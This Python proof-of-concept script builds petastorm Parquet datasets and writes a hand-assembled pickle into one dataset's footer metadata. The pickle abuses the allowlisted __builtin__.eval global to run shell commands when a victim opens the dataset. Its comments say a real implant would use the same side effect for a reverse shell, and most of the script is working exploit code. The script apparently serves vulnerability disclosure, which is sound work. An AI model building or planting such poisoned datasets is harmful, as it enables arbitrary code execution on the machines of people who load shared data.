#!/usr/bin/env python3
"""Build the model-package candidates used by this PoC.

Each candidate is an ordinary, complete petastorm Parquet dataset directory:

    <dataset>/
    |-- part-00000.parquet     data row(s), plain Parquet
    |-- _metadata              dataset-level Parquet footer (row-group index)
    `-- _common_metadata       Parquet footer carrying the petastorm key-value metadata

Neither directory contains a .py file, a plugin or a native library: the only thing
that changes between the arms is the byte string stored under the fixed footer key
``dataset-toolkit.unischema.v1``.

Arms built here:

  dataset_benign    unischema value = a real pickled ``petastorm.unischema.Unischema``
  dataset_evil      unischema value = a pickle stream whose single global is
                    ``__builtin__.eval`` -- a module listed in petastorm's
                    ``safe_modules`` allowlist (petastorm/etl/legacy.py:22-31)
  dataset_blocked   same reduction shape, but the global is ``os.system``, which is
                    NOT allowlisted: proves the allowlist itself is what stops it

Run:  python make_poc.py
"""

import hashlib
import json
import os
import pickle
import shutil
import struct

import numpy as np
import pyarrow as pa
import pyarrow.parquet as pq
from pyspark.sql.types import DoubleType, IntegerType

from petastorm.codecs import ScalarCodec
from petastorm.unischema import Unischema, UnischemaField

UNISCHEMA_KEY = b'dataset-toolkit.unischema.v1'
ROWGROUPS_KEY = b'dataset-toolkit.num_row_groups_per_file.v1'
DATA_FILE = 'part-00000.parquet'
PROOF_FILE = '/tmp/petastorm-rce-proof.txt'

# The expression handed to ``eval`` by the pickle REDUCE opcode. It writes the output of
# ``id`` to a file (the side effect a real implant would use for a reverse shell), prints
# a line so the execution is visible in the victim process's own stdout, and then returns
# the file content so that the caller prints it as if it were the dataset schema.
PAYLOAD_EXPR = (
    "__import__('os').system('id > {proof}')"
    " or __import__('builtins').print('[petastorm] arbitrary code executed as:',"
    " open('{proof}').read().strip())"
    " or open('{proof}').read()"
).format(proof=PROOF_FILE)


def reduction_pickle(module, name, expr):
    """Hand-assembled protocol-2 pickle stream: ``<module>.<name>(<expr>)``.

    Protocol 2 is required: ``pickle.Unpickler.find_class`` only applies the
    ``_compat_pickle`` legacy aliases (``__builtin__`` -> ``builtins``) when
    ``proto < 3``, which is exactly why the legacy module name reaches the real
    builtin on Python 3.
    """
    body = expr.encode('utf-8')
    stream = b'\x80\x02'                                            # PROTO 2
    stream += b'c' + module.encode('ascii') + b'\n' + name.encode('ascii') + b'\n'  # GLOBAL
    stream += b'('                                                  # MARK
    stream += b'X' + struct.pack('<I', len(body)) + body             # BINUNICODE -> str
    stream += b't'                                                  # TUPLE
    stream += b'R'                                                  # REDUCE -> name(expr)
    stream += b'.'                                                  # STOP
    return stream


def benign_unischema():
    """A genuine petastorm schema, pickled exactly the way materialize_dataset does."""
    schema = Unischema('ModelPackageSchema', [
        UnischemaField('row_id', np.int32, (), ScalarCodec(IntegerType()), False),
        UnischemaField('score', np.float64, (), ScalarCodec(DoubleType()), False),
    ])
    return schema, pickle.dumps(schema)


def build_dataset(path, unischema_value, rows):
    """Write a complete, readable petastorm dataset directory at ``path``."""
    if os.path.isdir(path):
        shutil.rmtree(path)
    os.makedirs(path)

    table = pa.table({
        'row_id': pa.array([r[0] for r in rows], pa.int32()),
        'score': pa.array([r[1] for r in rows], pa.float64()),
    })
    data_path = os.path.join(path, DATA_FILE)
    pq.write_table(table, data_path)

    # Dataset-level footer: one row group per data file, path relative to the dataset.
    file_metadata = pq.read_metadata(data_path)
    file_metadata.set_file_path(DATA_FILE)

    key_value = {
        UNISCHEMA_KEY: unischema_value,
        ROWGROUPS_KEY: json.dumps({DATA_FILE: file_metadata.num_row_groups}).encode('ascii'),
    }
    schema = table.schema.with_metadata(key_value)

    # pq.write_metadata() writes an empty (0-row) Parquet file at the given path and, when
    # a collector is passed, appends those row groups to that file's footer. It needs a
    # path, not an open file object, because it re-reads the file it just wrote.
    pq.write_metadata(schema, os.path.join(path, '_common_metadata'))
    pq.write_metadata(schema, os.path.join(path, '_metadata'),
                      metadata_collector=[file_metadata])


def describe(path, label, note):
    print('=== {} ==='.format(label))
    for name in sorted(os.listdir(path)):
        full = os.path.join(path, name)
        digest = hashlib.sha256(open(full, 'rb').read()).hexdigest()
        print('  {:<20} {:>7} bytes  sha256 {}'.format(name, os.path.getsize(full), digest[:32]))
    dataset = pq.ParquetDataset(path, validate_schema=False)
    raw = dataset.common_metadata.metadata[UNISCHEMA_KEY]
    print('  {} -> {}'.format(UNISCHEMA_KEY.decode(), note))
    print('  value[:96] = {!r}'.format(raw[:96]))
    print('  value len  = {} bytes'.format(len(raw)))
    print()


def main():
    rows = [(1, 0.25), (2, 0.50), (3, 0.75)]

    schema, benign_bytes = benign_unischema()
    evil_bytes = reduction_pickle('__builtin__', 'eval', PAYLOAD_EXPR)
    blocked_bytes = reduction_pickle('os', 'system', 'id > ' + PROOF_FILE)

    build_dataset('dataset_benign', benign_bytes, rows)
    build_dataset('dataset_evil', evil_bytes, rows)
    build_dataset('dataset_blocked', blocked_bytes, rows)

    print('payload expression handed to eval:')
    print('  {}'.format(PAYLOAD_EXPR))
    print()
    describe('dataset_benign', 'dataset_benign',
             'pickled petastorm Unischema "{}"'.format(schema._name))
    describe('dataset_evil', 'dataset_evil',
             'pickle stream referencing the allowlisted global __builtin__.eval')
    describe('dataset_blocked', 'dataset_blocked',
             'same reduction, global os.system (not allowlisted)')

    with open('SHA256SUMS.txt', 'w') as sums:
        for path in ('dataset_benign', 'dataset_evil', 'dataset_blocked'):
            for name in sorted(os.listdir(path)):
                full = os.path.join(path, name)
                digest = hashlib.sha256(open(full, 'rb').read()).hexdigest()
                sums.write('{}  {}\n'.format(digest, full.replace(os.sep, '/')))
    print('wrote SHA256SUMS.txt')


if __name__ == '__main__':
    main()
